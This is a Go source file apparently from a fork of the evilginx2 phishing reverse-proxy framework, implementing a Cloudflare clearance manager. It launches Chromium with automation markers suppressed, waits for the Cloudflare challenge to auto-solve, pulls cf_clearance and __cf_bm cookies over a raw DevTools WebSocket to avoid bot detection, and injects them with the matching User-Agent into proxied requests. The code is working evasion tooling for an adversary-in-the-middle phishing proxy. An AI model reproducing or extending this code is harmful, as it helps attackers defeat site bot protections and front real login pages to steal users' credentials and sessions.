package core

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/gobwas/ws"
	"github.com/gobwas/ws/wsutil"

	"github.com/kgretzky/evilginx2/log"
)

// CfClearanceCookie stores a harvested Cloudflare clearance cookie
type CfClearanceCookie struct {
	Name      string
	Value     string
	Domain    string
	Path      string
	Expires   time.Time
	Harvested time.Time
}

// CfClearanceManager handles Cloudflare clearance cookie harvesting and injection
type CfClearanceManager struct {
	mu            sync.RWMutex
	cookies       map[string][]*CfClearanceCookie // orig domain -> cookies
	userAgents    map[string]string               // domain -> User-Agent from harvesting browser
	harvesting    map[string]bool                 // domain -> currently harvesting
	chromiumPath  string
	display       string
	enabled       bool
	onHarvestFunc func() // callback after successful harvest (e.g., flush connections)
}

// NewCfClearanceManager creates a new CF clearance manager
func NewCfClearanceManager() *CfClearanceManager {
	return &CfClearanceManager{
		cookies:    make(map[string][]*CfClearanceCookie),
		userAgents: make(map[string]string),
		harvesting: make(map[string]bool),
		display:    ":99",
		enabled:    true,
	}
}

// SetOnHarvest sets a callback to run after successful harvest
// (used to flush idle connections so new ones use uTLS)
func (m *CfClearanceManager) SetOnHarvest(fn func()) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.onHarvestFunc = fn
}

// SetChromiumPath sets the chromium binary path
func (m *CfClearanceManager) SetChromiumPath(path string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.chromiumPath = path
}

// SetDisplay sets the X11 display
func (m *CfClearanceManager) SetDisplay(display string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.display = display
}

// SetEnabled enables or disables CF clearance injection
func (m *CfClearanceManager) SetEnabled(enabled bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.enabled = enabled
}

// IsEnabled returns whether CF clearance is enabled
func (m *CfClearanceManager) IsEnabled() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.enabled
}

// IsHarvesting returns whether a harvest is in progress for the given domain
func (m *CfClearanceManager) IsHarvesting(domain string) bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.harvesting[domain]
}

// Harvest launches a real chromium browser (no automation flags), navigates to the
// CF-protected domain, waits for the managed challenge to auto-solve, and extracts
// the cf_clearance cookie via raw CDP WebSocket (no chromedp to avoid automation detection).
func (m *CfClearanceManager) Harvest(domain string) error {
	m.mu.Lock()
	if m.harvesting[domain] {
		m.mu.Unlock()
		return fmt.Errorf("already harvesting cf_clearance for %s", domain)
	}
	m.harvesting[domain] = true
	chromiumPath := m.chromiumPath
	display := m.display
	m.mu.Unlock()

	defer func() {
		m.mu.Lock()
		delete(m.harvesting, domain)
		m.mu.Unlock()
	}()

	targetURL := "https://" + domain + "/"
	log.Info("[cf_clearance] starting harvest for %s", domain)

	// Determine chromium binary
	if chromiumPath == "" {
		for _, candidate := range []string{"chromium-browser", "chromium", "google-chrome-stable", "google-chrome"} {
			if p, err := exec.LookPath(candidate); err == nil {
				chromiumPath = p
				break
			}
		}
		if chromiumPath == "" {
			return fmt.Errorf("chromium not found — set with: evilpuppet chromium_path <path>")
		}
	}

	// Create temporary user data dir
	userDataDir, err := ioutil.TempDir("", "cf_clearance_*")
	if err != nil {
		return fmt.Errorf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(userDataDir)

	debugPort := "9224"

	// Launch chromium with MINIMAL flags — no automation markers.
	// This matches the manual approach that successfully solves CF challenges.
	args := []string{
		"--no-sandbox",
		"--disable-gpu",
		"--remote-debugging-port=" + debugPort,
		"--user-data-dir=" + userDataDir,
		"--disable-blink-features=AutomationControlled",
		"--disable-infobars",
		"--disable-extensions",
		"--window-size=1920,1080",
		targetURL,
	}

	cmd := exec.Command(chromiumPath, args...)
	if display != "" {
		cmd.Env = append(os.Environ(), "DISPLAY="+display)
	}
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start chromium: %v", err)
	}

	// Ensure browser is killed when we're done
	defer func() {
		if cmd.Process != nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}()

	log.Debug("[cf_clearance] chromium started (PID %d, display %s)", cmd.Process.Pid, display)

	// Wait for remote debugging to become available (just verify, don't connect yet)
	debugURL := "http://localhost:" + debugPort
	debugAvailable := false
	for attempt := 0; attempt < 15; attempt++ {
		time.Sleep(1 * time.Second)
		client := &http.Client{Timeout: 2 * time.Second}
		resp, err := client.Get(debugURL + "/json/version")
		if err != nil {
			log.Debug("[cf_clearance] waiting for chromium debug port (attempt %d)...", attempt+1)
			continue
		}
		resp.Body.Close()
		debugAvailable = true
		break
	}

	if !debugAvailable {
		return fmt.Errorf("failed to connect to chromium remote debugging on port %s", debugPort)
	}

	log.Debug("[cf_clearance] chromium debug port ready, waiting for CF challenge to solve...")

	// CRITICAL: Wait for CF challenge to auto-solve WITHOUT any CDP connection.
	// chromedp's NewRemoteAllocator/NewContext sends Runtime.enable, Page.enable,
	// target.SetAutoAttach etc. which trigger CF's automation detection.
	// Instead, we just wait, then use raw WebSocket to extract cookies.
	time.Sleep(12 * time.Second)

	// Capture User-Agent from the browser (critical: cf_clearance is UA-bound)
	harvestedUA := m.getUserAgentFromDebug(debugURL)
	if harvestedUA != "" {
		log.Debug("[cf_clearance] captured browser UA: %s", harvestedUA)
	}

	// Now poll for cf_clearance using raw CDP WebSocket (no chromedp)
	var cfCookies []*CfClearanceCookie
	maxAttempts := 10
	for attempt := 0; attempt < maxAttempts; attempt++ {
		cookies, err := m.getCookiesViaRawCDP(debugURL, targetURL)
		if err != nil {
			log.Debug("[cf_clearance] cookie check attempt %d failed: %v", attempt+1, err)
			time.Sleep(3 * time.Second)
			continue
		}

		for _, c := range cookies {
			if c.Name == "cf_clearance" {
				cfCookies = append(cfCookies, c)
			}
		}

		if len(cfCookies) > 0 {
			// Also grab __cf_bm if present
			for _, c := range cookies {
				if c.Name == "__cf_bm" {
					cookieDomain := strings.TrimPrefix(c.Domain, ".")
					if cookieDomain == domain || strings.HasSuffix(domain, "."+cookieDomain) {
						cfCookies = append(cfCookies, c)
					}
				}
			}
			break
		}

		log.Debug("[cf_clearance] attempt %d/%d — cf_clearance not yet set", attempt+1, maxAttempts)
		time.Sleep(3 * time.Second)
	}

	if len(cfCookies) == 0 {
		return fmt.Errorf("failed to harvest cf_clearance for %s — challenge did not auto-solve within timeout", domain)
	}

	// Store cookies AND User-Agent (both are needed for valid replay)
	m.mu.Lock()
	m.cookies[domain] = cfCookies
	if harvestedUA != "" {
		m.userAgents[domain] = harvestedUA
	}
	m.mu.Unlock()

	for _, c := range cfCookies {
		log.Success("[cf_clearance] harvested %s for domain %s (expires %s)", c.Name, c.Domain, c.Expires.Format(time.RFC3339))
	}
	if harvestedUA != "" {
		log.Success("[cf_clearance] stored User-Agent for TLS fingerprint matching")
	}

	// Run post-harvest callback (e.g., flush idle connections to force uTLS)
	m.mu.RLock()
	onHarvest := m.onHarvestFunc
	m.mu.RUnlock()
	if onHarvest != nil {
		onHarvest()
	}

	return nil
}

// cdpRequest is a CDP protocol request
type cdpRequest struct {
	ID     int                    `json:"id"`
	Method string                 `json:"method"`
	Params map[string]interface{} `json:"params,omitempty"`
}

// cdpCookie represents a cookie from CDP Network.getCookies response
type cdpCookie struct {
	Name    string  `json:"name"`
	Value   string  `json:"value"`
	Domain  string  `json:"domain"`
	Path    string  `json:"path"`
	Expires float64 `json:"expires"`
}

// getCookiesViaRawCDP extracts cookies using raw CDP WebSocket (gobwas/ws).
// This avoids chromedp's automation-enabling CDP commands that trigger CF detection.
func (m *CfClearanceManager) getCookiesViaRawCDP(debugURL, targetURL string) ([]*CfClearanceCookie, error) {
	// Get page targets
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(debugURL + "/json")
	if err != nil {
		return nil, fmt.Errorf("failed to get page targets: %v", err)
	}
	defer resp.Body.Close()

	var targets []struct {
		WebSocketDebuggerURL string `json:"webSocketDebuggerUrl"`
		URL                  string `json:"url"`
		Type                 string `json:"type"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return nil, fmt.Errorf("failed to decode targets: %v", err)
	}

	// Find the first page target
	var pageWSURL string
	for _, t := range targets {
		if t.Type == "page" && t.WebSocketDebuggerURL != "" {
			pageWSURL = t.WebSocketDebuggerURL
			log.Debug("[cf_clearance] page URL: %s", t.URL)
			break
		}
	}
	if pageWSURL == "" {
		return nil, fmt.Errorf("no page target found")
	}

	// Connect via raw WebSocket using gobwas/ws
	conn, _, _, err := ws.Dial(context.Background(), pageWSURL)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to page WebSocket: %v", err)
	}
	defer conn.Close()

	// Send Network.getCookies command
	req := cdpRequest{
		ID:     1,
		Method: "Network.getCookies",
		Params: map[string]interface{}{
			"urls": []string{targetURL},
		},
	}
	reqData, _ := json.Marshal(req)
	if err := wsutil.WriteClientMessage(conn, ws.OpText, reqData); err != nil {
		return nil, fmt.Errorf("failed to send CDP command: %v", err)
	}

	// Read response (with timeout)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	data, _, err := wsutil.ReadServerData(conn)
	if err != nil {
		return nil, fmt.Errorf("failed to read CDP response: %v", err)
	}

	// Parse response
	var cdpResp struct {
		ID     int `json:"id"`
		Result struct {
			Cookies []cdpCookie `json:"cookies"`
		} `json:"result"`
	}
	if err := json.Unmarshal(data, &cdpResp); err != nil {
		return nil, fmt.Errorf("failed to parse CDP response: %v", err)
	}

	// Convert to our cookie type
	var cookies []*CfClearanceCookie
	for _, c := range cdpResp.Result.Cookies {
		cookies = append(cookies, &CfClearanceCookie{
			Name:      c.Name,
			Value:     c.Value,
			Domain:    c.Domain,
			Path:      c.Path,
			Expires:   time.Unix(int64(c.Expires), 0),
			Harvested: time.Now(),
		})
	}

	return cookies, nil
}

// SetManual manually sets a cf_clearance cookie for a domain
func (m *CfClearanceManager) SetManual(domain, value string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	m.cookies[domain] = []*CfClearanceCookie{
		{
			Name:      "cf_clearance",
			Value:     value,
			Domain:    "." + domain,
			Path:      "/",
			Expires:   time.Now().Add(365 * 24 * time.Hour),
			Harvested: time.Now(),
		},
	}
	log.Success("[cf_clearance] manually set cf_clearance for %s", domain)
}

// HasClearance checks if we have a valid cf_clearance for the given domain
func (m *CfClearanceManager) HasClearance(domain string) bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.hasClearanceForDomain(domain)
}

// hasClearanceForDomain checks (without lock) for valid cf_clearance
func (m *CfClearanceManager) hasClearanceForDomain(domain string) bool {
	if cookies, ok := m.cookies[domain]; ok {
		for _, c := range cookies {
			if c.Name == "cf_clearance" && time.Now().Before(c.Expires) {
				return true
			}
		}
	}

	for storedDomain, cookies := range m.cookies {
		if domainMatchesCookie(domain, storedDomain) {
			for _, c := range cookies {
				if c.Name == "cf_clearance" && time.Now().Before(c.Expires) {
					return true
				}
			}
		}
	}

	return false
}

// InjectCookies adds harvested cf_clearance cookies to outgoing requests
func (m *CfClearanceManager) InjectCookies(req *http.Request) {
	if !m.IsEnabled() {
		return
	}

	host := req.Host
	if host == "" {
		host = req.URL.Host
	}
	if idx := strings.IndexByte(host, ':'); idx >= 0 {
		host = host[:idx]
	}

	m.mu.RLock()
	defer m.mu.RUnlock()

	injected := false
	for _, cookies := range m.cookies {
		for _, c := range cookies {
			if time.Now().After(c.Expires) {
				continue
			}
			cookieDomain := strings.TrimPrefix(c.Domain, ".")
			if host == cookieDomain || strings.HasSuffix(host, "."+cookieDomain) {
				existingCookies := req.Header.Get("Cookie")
				if !strings.Contains(existingCookies, c.Name+"=") {
					if existingCookies != "" {
						req.Header.Set("Cookie", existingCookies+"; "+c.Name+"="+c.Value)
					} else {
						req.Header.Set("Cookie", c.Name+"="+c.Value)
					}
					injected = true
				}
			}
		}
	}

	if injected {
		log.Debug("[cf_clearance] injected cookies for %s", host)
	}
}

// Clear removes all stored cf_clearance cookies
func (m *CfClearanceManager) Clear() {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.cookies = make(map[string][]*CfClearanceCookie)
	log.Info("[cf_clearance] cleared all stored cookies")
}

// ClearDomain removes cf_clearance cookies for a specific domain
func (m *CfClearanceManager) ClearDomain(domain string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	delete(m.cookies, domain)
	log.Info("[cf_clearance] cleared cookies for %s", domain)
}

// GetStatus returns status info for all stored domains
func (m *CfClearanceManager) GetStatus() []CfClearanceStatus {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var statuses []CfClearanceStatus
	for domain, cookies := range m.cookies {
		for _, c := range cookies {
			if c.Name == "cf_clearance" {
				remaining := time.Until(c.Expires)
				valid := remaining > 0
				statuses = append(statuses, CfClearanceStatus{
					Domain:    domain,
					CookieDom: c.Domain,
					Valid:     valid,
					Expires:   c.Expires,
					Remaining: remaining,
					Harvested: c.Harvested,
				})
			}
		}
	}
	return statuses
}

// CfClearanceStatus holds status info for display
type CfClearanceStatus struct {
	Domain    string
	CookieDom string
	Valid     bool
	Expires   time.Time
	Remaining time.Duration
	Harvested time.Time
}

// GetUserAgent returns the harvested User-Agent for a domain, or "" if none.
// The UA must be replayed in proxy requests to CF-protected origins because
// cf_clearance is bound to the UA that solved the challenge (Section 12.4).
func (m *CfClearanceManager) GetUserAgent(host string) string {
	m.mu.RLock()
	defer m.mu.RUnlock()

	// Exact match first
	if ua, ok := m.userAgents[host]; ok {
		return ua
	}
	// Check parent domain matches
	for storedDomain, ua := range m.userAgents {
		if domainMatchesCookie(host, storedDomain) {
			return ua
		}
	}
	return ""
}

// getUserAgentFromDebug reads the browser's User-Agent from Chrome's
// /json/version remote debugging endpoint (no CDP commands needed).
func (m *CfClearanceManager) getUserAgentFromDebug(debugURL string) string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(debugURL + "/json/version")
	if err != nil {
		log.Debug("[cf_clearance] failed to get browser version: %v", err)
		return ""
	}
	defer resp.Body.Close()

	var info struct {
		UserAgent string `json:"User-Agent"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&info); err != nil {
		log.Debug("[cf_clearance] failed to decode version info: %v", err)
		return ""
	}
	return info.UserAgent
}

// domainMatchesCookie checks if a host matches a cookie domain
func domainMatchesCookie(host, cookieDomain string) bool {
	cookieDomain = strings.TrimPrefix(cookieDomain, ".")
	return host == cookieDomain || strings.HasSuffix(host, "."+cookieDomain)
}
